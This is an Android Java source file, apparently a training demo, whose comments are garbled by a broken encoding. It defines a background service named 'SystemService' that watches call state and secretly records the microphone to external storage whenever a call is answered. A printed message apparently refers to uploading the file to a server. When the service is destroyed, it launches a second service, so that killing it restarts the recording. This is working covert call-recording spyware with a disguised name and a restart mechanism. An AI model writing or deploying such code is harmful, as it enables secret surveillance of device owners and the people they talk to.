package com.itheima.phonelistener;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class SystemService extends Service {
	// �绰������
	private TelephonyManager tm;
	// ����������
	private MyListener listener;
	//����¼����
	private MediaRecorder mediaRecorder;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	// ���񴴽���ʱ����õķ���
	@Override
	public void onCreate() {
		// ��̨�����绰�ĺ���״̬��
		// �õ��绰������
		tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		listener = new MyListener();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}

	private class MyListener extends PhoneStateListener {
		// ���绰�ĺ���״̬�����仯��ʱ����õķ���
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE://����״̬��
					if(mediaRecorder!=null){
						//8.ֹͣ����
						mediaRecorder.stop();
						//9.�ͷ���Դ
						mediaRecorder.release();
						mediaRecorder = null;
						System.out.println("¼����ϣ��ϴ��ļ�����������");
					}
					
					break;
				case TelephonyManager.CALL_STATE_RINGING://����״̬��
					
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK://ͨ��״̬
					//��ʼ¼��
					//1.ʵ����һ��¼����
					mediaRecorder = new MediaRecorder();
					//2.ָ��¼����������Դ
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					//3.����¼�Ƶ��ļ�����ĸ�ʽ
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					//4.ָ��¼���ļ�������
					File file = new File(Environment.getExternalStorageDirectory(),System.currentTimeMillis()+".3gp");
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					//5.������Ƶ�ı���
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					//6.׼����ʼ¼��
					mediaRecorder.prepare();
					//7.��ʼ¼��
					mediaRecorder.start();
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	// �������ٵ�ʱ����õķ���
	@Override
	public void onDestroy() {
		super.onDestroy();
		// ȡ���绰�ļ���
		System.out.println("ondestory");
		Intent i = new Intent(this,SystemService2.class);
		startService(i);
		tm.listen(listener, PhoneStateListener.LISTEN_NONE);
		listener = null;
	}

}
